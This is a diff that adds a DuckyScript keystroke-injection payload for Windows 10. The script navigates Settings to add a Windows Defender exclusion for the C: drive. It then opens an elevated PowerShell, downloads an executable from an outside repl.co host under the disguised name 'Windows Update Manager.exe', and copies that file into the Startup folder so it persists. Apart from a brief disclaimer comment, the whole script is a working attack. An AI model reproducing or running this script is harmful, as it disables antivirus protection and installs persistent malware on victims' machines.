@@ -1,0 +1,91 @@
+REM AUTHOR: Eddie Devine
+REM TARGET: Windows 10
+REM DESCRIPTION: Installs to startup and runs Enderman's WindowsUpdate.exe.
+REM DO NOT USE THIS SCRIPT FOR HARMFUL OR ILLEGAL PURPOSES
+REM Disable Windows Defender:
+DELAY 1000
+CONTROL ESCAPE
+DELAY 500
+STRING Settings
+DELAY 500
+ENTER
+DELAY 300
+TAB
+DOWN
+DOWN
+DOWN
+ENTER
+DELAY 500
+TAB
+DOWN
+DOWN
+ENTER
+DELAY 500
+TAB
+TAB
+ENTER
+DELAY 500
+TAB
+TAB
+TAB
+TAB
+ENTER
+DELAY 500
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+DOWN
+ENTER
+DELAY 500
+STRING C:
+TAB
+ENTER
+DELAY 500
+ALT y
+DELAY 500
+ALT F4
+DELAY 100
+ALT F4
+REM Download and Run Malware:
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+CONTROL SHIFT ENTER
+DELAY 750
+ALT y
+DELAY 1000
+STRING $url = "https://FILEHOST.eddie09.repl.co/Windows_Update_Manager.exe"
+ENTER
+STRING $outpath = "C:\Windows Update Manager.exe"
+ENTER
+STRING Invoke-WebRequest -Uri $url -OutFile $outpath
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+GUI r
+DELAY 500
+STRING cmd /c copy "C:\Windows Update Manager.exe" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
+ENTER
+GUI
+DELAY 100
+TAB
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+ENTER
+DELAY 100
+DOWN
+DOWN
+ENTER
